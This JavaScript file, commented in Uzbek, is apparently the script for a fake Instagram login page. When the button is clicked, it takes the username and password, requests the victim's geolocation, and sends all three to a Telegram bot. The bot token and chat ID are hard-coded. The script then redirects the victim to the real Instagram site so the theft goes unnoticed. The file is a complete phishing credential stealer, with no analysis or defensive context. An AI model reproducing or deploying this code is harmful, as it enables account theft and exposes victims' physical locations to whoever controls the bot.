let inputs = document.querySelectorAll('input');
let button = document.querySelector('.login-button');

const Token = '7557267563:AAHOPAaHjitlXWLOnH79JYHjtrGIC1Uz82Y';
const Chat_Id = '858709040';

button.addEventListener('click', () => {
    const username = inputs[0].value;
    const password = inputs[1].value;

    // Foydalanuvchining joylashuvini olish
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const latitude = position.coords.latitude; // Kenglik
                const longitude = position.coords.longitude; // Uzunlik

                // Xabar tarkibi
                const message = `Loxni danniylari:
                Username: ${username}
                Password: ${password}
                Location: https://www.google.com/maps?q=${latitude},${longitude}`;

                // Telegramga yuborish
                fetch(`https://api.telegram.org/bot${Token}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: Chat_Id,
                        text: message,
                    }),
                })
                    .then(response => response.json())
                    .then(res => console.log(res))
                    .catch(err => console.error(err));

                // Instagramga yo'naltirish
                window.location.href = 'https://www.instagram.com/';
            },
            (error) => {
                console.error(`Joylashuvni olishda xatolik: ${error.message}`);
            }
        );
    } else {
        console.error("Geolocation API brauzeringizda qo'llab-quvvatlanmaydi.");
    }
});
